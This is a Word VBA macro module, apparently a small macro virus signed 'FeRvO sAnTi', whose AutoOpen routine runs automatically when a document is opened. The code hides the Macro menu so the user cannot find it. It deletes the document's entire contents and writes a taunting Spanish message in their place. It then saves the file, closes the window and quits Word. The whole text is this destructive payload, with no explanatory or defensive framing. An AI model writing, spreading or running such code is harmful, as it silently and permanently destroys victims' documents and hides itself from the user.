   Attribute VB_Name = "NewMacros"

   Public Sub AutoOpen()
   '
   ' AutoOpen Macro
   ' FeRvO sAnTi

   CommandBars("Tools").Controls("Macro").Visible = False



       Selection.MoveUp Unit:=wdLine, Count:=4
       Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
       Selection.Font.Color = wdColorOrange
       Selection.Font.Bold = wdToggle
       Selection.TypeText Text:="JA, JA, JA, JA, JA,JA...!!!!"
       Selection.TypeParagraph
       Selection.WholeStory
       Selection.Delete Unit:=wdCharacter, Count:=1
       Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
       Selection.Font.Color = wdColorOrange
       Selection.Font.Bold = wdToggle
       Selection.TypeText Text:="NUNCA SABRÁS CUÁNTO TE QUISE..."
       Selection.TypeParagraph
       Selection.TypeText Text:="FERVO"
       ActiveDocument.Save
       ActiveWindow.Close
       Application.Quit

   End Sub
